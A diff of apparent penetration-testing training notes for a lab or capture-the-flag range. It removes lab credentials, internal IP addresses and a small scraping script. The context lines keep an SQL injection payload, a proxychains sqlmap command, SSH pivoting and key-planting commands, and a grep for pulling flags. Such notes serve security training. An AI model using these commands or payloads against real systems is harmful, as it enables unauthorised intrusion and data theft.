@@ -1,23 +1,3 @@
-///Day 1\\\
-
-http://security-ctfd-1.server.kinetic:8000 -or- http://10.50.24.116:8000
-username: user303A20008REEGDIOGBD600
-password: e9YErLDvFlUWxX0
-
-Windows:
-Private: 192.168.65.10
-Float: 10.50.31.135
-xfreerdp /v:10.50.31.135 /u:student /size:1920x1000 /clipboard
-
-Linux:
-Private: 192.168.65.20
-Float: 10.50.23.229
-
-Internet-Grey-Host:
-10.50.28.45	e9YErLDvFlUWxX0
-
-ssh escape sequence (shift ~ release c)
-
 /////////////Resources\\\\\\\\\\\\\
 
 shell-storm.org
@@ -28,19 +8,6 @@ ubuntu metasploit install --> compluting for geeks
 socks proxy rfc
 wayback machine
 sqlbolt.com
-
-////////Scraping Data Script\\\\\\\\
-
-import lxml.html
-import requests
-
-page = requests.get('http://quotes.toscrape.com')
-tree = lxml.html.fromstring(page.content)
-
-authors = tree.xpath('//small[@class="author"]/text()')
-
-print ('Authors: ',authors)
-
 /////////HTTP reponse codes////////
 10X == Informational
 2XX == Success
@@ -66,8 +33,6 @@ wget --mirror <ip>	#recursively copies all webpages it finds, not stopped by rob
 	egrep -ir '\bf..g\b' 		#cd into the dir wget creates, this looks for mutated "flag"
 
 /////////proxychains with firefox/////////
-preferences-->connection settings-->sockshost localhost 9050
--or-
 addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
 
 /////////CURL/////////
@@ -149,9 +114,6 @@ admin' UNION SELECT name,2,3,4,5 from session.user;#
 ==========================================================================================
 ///////////Recon Flags\\\\\\\\\\\\\\\\\\
 
-->internet_grey_host: 10.50.28.45
-->Network scan: 192.168.28.96/27	(97-126) 
-->Network scan:192.168.150.224/27	(224-254)
 #pulls the flags --> grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'
 
 #Create tunnel to internet_grey_host
@@ -213,7 +175,7 @@ proxychains sqlmap -u http://10.100.28.48/cases/productsCategory.php?category=1 
 
 #SSH
 ssh -D 127.0.0.1:9050 user@ip -CNTX #dynamic pivot for proxychains
-ssh-keygen -t rsa #creates ~/.ssh id_rsa id_rsa.pub
+ssh-keygen -t rsa 							#creates ~/.ssh id_rsa id_rsa.pub
 ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
 ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
 
